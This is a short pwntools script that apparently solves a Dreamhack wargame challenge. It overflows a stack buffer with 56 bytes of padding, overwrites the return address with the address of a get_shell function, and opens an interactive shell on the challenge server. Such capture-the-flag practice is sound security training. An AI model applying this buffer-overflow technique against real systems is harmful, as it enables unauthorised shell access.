from pwn import *

#p = process('./rao')
p = remote('host3.dreamhack.games', 22781)
get_shell = 0x4006aa

payload = b'a' * 56 + p64(get_shell)
p.sendline(payload)
p.interactive()